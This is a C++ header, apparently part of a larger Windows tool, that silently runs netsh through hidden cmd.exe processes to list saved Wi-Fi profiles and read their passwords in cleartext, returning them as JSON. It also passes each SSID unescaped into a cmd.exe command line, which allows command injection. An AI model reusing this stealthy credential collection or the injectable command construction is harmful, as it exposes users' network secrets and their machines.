#pragma once
#include <string>
#include <vector>
#include <array>
#include <windows.h>
#include <nlohmann/json.hpp>
#include <thread>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <atomic>

using json = nlohmann::json;

class WifiSearcher
{
public:
    // === API chính để ProcessHandlers gọi ===
    static json getWifiInfo()
    {
        SetConsoleOutputCP(CP_UTF8);
        SetConsoleCP(CP_UTF8);

        json result;
        std::string current = getCurrentWifi();

        result["current"] = current.empty() ? nullptr : current;
        result["networks"] = json::array();

        // Lấy danh sách profile
        std::vector<std::string> profiles = getWifiProfiles();

        if (profiles.empty())
        {
            return result;
        }

        // === TỐI ƯU: Thread pool với giới hạn 8 threads ===
        const size_t MAX_THREADS = 8;
        const size_t numThreads = (std::min)(MAX_THREADS, profiles.size());

        std::vector<json> networkResults(profiles.size());
        std::mutex resultMutex;
        std::atomic<size_t> nextIndex(0);

        auto worker = [&]()
        {
            while (true)
            {
                size_t i = nextIndex.fetch_add(1);
                if (i >= profiles.size())
                    break;

                const auto &ssid = profiles[i];
                std::string password = getWifiPassword(ssid);
                bool connected = (!current.empty() && ssid == current);

                std::lock_guard<std::mutex> lock(resultMutex);
                networkResults[i] = {
                    {"ssid", ssid},
                    {"password", password},
                    {"connected", connected}};
            }
        };

        // Tạo thread pool
        std::vector<std::thread> threads;
        for (size_t i = 0; i < numThreads; ++i)
        {
            threads.emplace_back(worker);
        }

        // Đợi tất cả threads hoàn thành
        for (auto &t : threads)
        {
            if (t.joinable())
                t.join();
        }

        // Thêm kết quả vào JSON (giữ nguyên thứ tự)
        for (const auto &net : networkResults)
        {
            if (!net.is_null())
            {
                result["networks"].push_back(net);
            }
        }

        return result;
    }

private:
    // === Helper chạy command KHÔNG HIỆN CỬA SỔ ===
    // Thay thế _popen bằng CreateProcess với cờ CREATE_NO_WINDOW
    static std::string exec(std::string cmd)
    {
        std::string result;
        HANDLE hPipeRead, hPipeWrite;

        SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

        // 1. Tạo Pipe để hứng kết quả trả về
        if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
            return "";

        // Đảm bảo handle đọc không bị inherit
        SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si = {sizeof(STARTUPINFOA)};
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE;   // Ẩn cửa sổ
        si.hStdOutput = hPipeWrite; // Hứng stdout
        si.hStdError = hPipeWrite;  // Hứng cả stderr

        PROCESS_INFORMATION pi = {0};

        // cmd.exe cần tham số /C để chạy lệnh
        cmd = "cmd.exe /C " + cmd;

        // 2. Tạo Process ẩn hoàn toàn
        // CREATE_NO_WINDOW: Cờ quan trọng nhất để không hiện console
        if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        {
            CloseHandle(hPipeWrite);
            CloseHandle(hPipeRead);
            return "";
        }

        // Đóng handle ghi bên phía cha, nếu không ReadFile sẽ đợi mãi
        CloseHandle(hPipeWrite);

        // 3. Đọc dữ liệu từ Pipe
        DWORD bytesRead;
        CHAR buffer[1024];
        while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0)
        {
            buffer[bytesRead] = '\0'; // Null-terminate
            result.append(buffer);
        }

        // Dọn dẹp
        CloseHandle(hPipeRead);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return result;
    }

    // === Trim chuỗi ===
    static std::string trim(const std::string &s)
    {
        size_t b = s.find_first_not_of(" \t\r\n"); // Thêm \n vào để trim xuống dòng thừa
        size_t e = s.find_last_not_of(" \t\r\n");
        return (b == std::string::npos) ? "" : s.substr(b, e - b + 1);
    }

    // === Lấy danh sách Wi-Fi đã từng kết nối ===
    static std::vector<std::string> getWifiProfiles()
    {
        std::vector<std::string> profiles;
        // Gọi hàm exec mới (ẩn window)
        std::string out = exec("netsh wlan show profile");

        const std::string key = "All User Profile";
        size_t pos = 0;

        while ((pos = out.find(key, pos)) != std::string::npos)
        {
            pos = out.find(':', pos);
            if (pos == std::string::npos)
                break;

            size_t end = out.find('\n', pos);
            profiles.push_back(trim(out.substr(pos + 1, end - pos)));
            pos = end;
        }
        return profiles;
    }

    // === Lấy password / trạng thái Wi-Fi ===
    static std::string getWifiPassword(const std::string &ssid)
    {
        // Gọi hàm exec mới (ẩn window)
        std::string out = exec(
            "netsh wlan show profile name=\"" + ssid + "\" key=clear");

        // Tìm key Content (Password)
        size_t pos = out.find("Key Content");
        if (pos != std::string::npos)
        {
            pos = out.find(':', pos);
            return trim(out.substr(pos + 1, out.find('\n', pos) - pos));
        }

        // Enterprise check
        if (out.find("802.1X") != std::string::npos)
            return "Enterprise";

        // Open Wi-Fi check
        // (Kiểm tra lỏng hơn chút để bắt được nhiều trường hợp)
        if (out.find("Authentication") != std::string::npos &&
            out.find("Open") != std::string::npos)
            return "Free Wifi";

        // Có bảo mật nhưng không lưu key (hoặc permission denied)
        if (out.find("Security key") != std::string::npos &&
            out.find("Present") != std::string::npos) // Key Present nhưng không đọc được
            return "Protected/No Permission";

        return "Absent";
    }

    // === Lấy Wi-Fi hiện tại ===
    static std::string getCurrentWifi()
    {
        // Gọi hàm exec mới (ẩn window)
        std::string out = exec("netsh wlan show interfaces");

        // Đảm bảo đang connected
        if (out.find("connected") == std::string::npos && out.find("Connected") == std::string::npos)
            return "";

        size_t pos = out.find("SSID");
        if (pos == std::string::npos)
            return "";

        // Cần cẩn thận vì dòng "BSSID" cũng chứa chữ "SSID"
        // Tìm " SSID" (có dấu cách trước) hoặc tìm dòng đầu tiên
        // Cách an toàn hơn: tìm " SSID" và dấu ":"

        // Reset pos để tìm lại chính xác dòng SSID (ko phải BSSID)
        pos = out.find("\n    SSID");
        if (pos == std::string::npos)
            pos = out.find("SSID"); // Fallback

        if (pos != std::string::npos)
        {
            pos = out.find(':', pos);
            if (pos != std::string::npos)
            {
                return trim(out.substr(pos + 1, out.find('\n', pos) - pos));
            }
        }

        return "";
    }
};